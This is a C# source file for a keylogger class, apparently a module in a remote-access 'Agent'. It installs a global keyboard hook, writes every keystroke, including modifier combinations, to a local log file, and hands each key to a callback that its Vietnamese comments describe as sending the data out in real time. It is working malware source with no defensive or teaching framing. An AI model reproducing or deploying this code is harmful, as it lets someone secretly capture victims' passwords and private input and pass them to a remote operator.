using System;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using System.IO;
using System.Text;

namespace Agent.Functions
{
    public class KeyLogger
    {
        private IKeyboardMouseEvents _globalHook;
        private string _filePath = "log_result.txt";
        private bool _isLogging = false;

        // Thêm Delegate này để báo cho Executor biết có phím mới
        public Action<string> OnKeyCaptured;

        public void Start()
        {
            if (_isLogging) return;
            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += OnKeyDown;
            _globalHook.KeyPress += OnKeyPress;
            _isLogging = true;
        }

        public void Stop()
        {
            if (!_isLogging) return;
            _globalHook.KeyDown -= OnKeyDown;
            _globalHook.KeyPress -= OnKeyPress;
            _globalHook.Dispose();
            _isLogging = false;
            // Sử dụng ExitThread để chỉ đóng luồng này, không đóng cả Agent
            Application.ExitThread();
        }

        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            string functionalKey = "";
            if (e.Control || e.Alt) functionalKey = $"[{e.Modifiers}+{e.KeyCode}]";
            else
            {
                switch (e.KeyCode)
                {
                    case Keys.Space: functionalKey = "[Space]"; break;
                    case Keys.Enter: functionalKey = "[Enter]"; break;
                    case Keys.Back: functionalKey = "[Back]"; break;
                    case Keys.Tab: functionalKey = "[Tab]"; break;
                }
            }
            if (!string.IsNullOrEmpty(functionalKey)) WriteLog(functionalKey);
        }

        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && e.KeyChar != ' ')
            {
                WriteLog(e.KeyChar.ToString());
            }
        }

        private void WriteLog(string text)
        {
            // 1. Ghi file (Backup)
            try { File.AppendAllText(_filePath, text, Encoding.UTF8); } catch { }

            // 2. Gửi dữ liệu ra ngoài qua Action (Real-time)
            OnKeyCaptured?.Invoke(text);
        }
    }

}